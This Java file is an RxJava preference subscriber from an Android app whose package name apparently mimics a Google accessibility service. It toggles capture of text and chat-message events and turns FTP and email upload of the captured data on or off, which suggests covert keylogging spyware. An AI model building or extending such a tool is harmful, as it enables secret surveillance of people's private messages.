package service.android.google.com.accessibility.rx.observer;

import android.content.res.Resources;

import com.github.pwittchen.prefser.library.Prefser;

import rx.Subscriber;
import service.android.google.com.accessibility.R;
import service.android.google.com.accessibility.util.preference.PreferenceChangeAware;
import timber.log.Timber;

/**
 * Created by tim on 29.03.16.
 */
public class ToggleEventSubscriber extends Subscriber<String> {
    private final PreferenceChangeAware preferenceChangeAware;
    private final Prefser prefser;

    private final boolean generalEventTrackingEnabled;
    private final boolean textEventTrackingEnabled;
    private final boolean chatEventTrackingEnabled;

    private final String generalEventTrackingPrefString;
    private final String textEventTrackingPrefString;
    private final String chatEventTrackingPrefString;

    private final String ftpUploaderPrefString;
    private final String emailUploaderPrefString;

    public ToggleEventSubscriber(final PreferenceChangeAware preferenceChangeAware,
                                 final Resources resources,
                                 final Prefser prefser) {
        this.generalEventTrackingEnabled = resources.getBoolean(R.bool.general_event);
        this.textEventTrackingEnabled = resources.getBoolean(R.bool.text_event);
        this.chatEventTrackingEnabled = resources.getBoolean(R.bool.chat_message_event);


        this.generalEventTrackingPrefString = resources.getString(R.string.pref_key_event_general);
        this.textEventTrackingPrefString = resources.getString(R.string.pref_key_event_text);
        this.chatEventTrackingPrefString = resources.getString(R.string.pref_key_chat_event);

        this.ftpUploaderPrefString = resources.getString(R.string.pref_key_FTP);
        this.emailUploaderPrefString = resources.getString(R.string.pref_key_email);

        this.preferenceChangeAware = preferenceChangeAware;
        this.prefser = prefser;
    }

    @Override
    public void onCompleted() {
    }

    @Override
    public void onError(final Throwable e) {
        Timber.e("Error with toggleEventSubscriber");
    }

    @Override
    public void onNext(final String key) {
        if (ftpUploaderPrefString.equals(key)){
            final Boolean ftpUploaderEnabled = prefser.get(key, Boolean.class, false);
            this.preferenceChangeAware.ftpUploaderChanged(ftpUploaderEnabled);
        }

        if (emailUploaderPrefString.equals(key)){
            final Boolean emailUploaderEnabled = prefser.get(key, Boolean.class, false);
            this.preferenceChangeAware.emailUploaderChanged(emailUploaderEnabled);
        }

        if (generalEventTrackingPrefString.equals(key)) {
            final Boolean general = prefser.get(key, Boolean.class, generalEventTrackingEnabled);
            this.preferenceChangeAware.eventTrackingChanged(general);
        }

        if (textEventTrackingPrefString.equals(key)) {
            final Boolean text = prefser.get(key, Boolean.class, textEventTrackingEnabled);
            this.preferenceChangeAware.textEventTrackingChanged(text);
        }

        if (chatEventTrackingPrefString.equals(key)) {
            final Boolean chat = prefser.get(key, Boolean.class, chatEventTrackingEnabled);
            this.preferenceChangeAware.chatEventTrackingChanged(chat);
        }
    }
}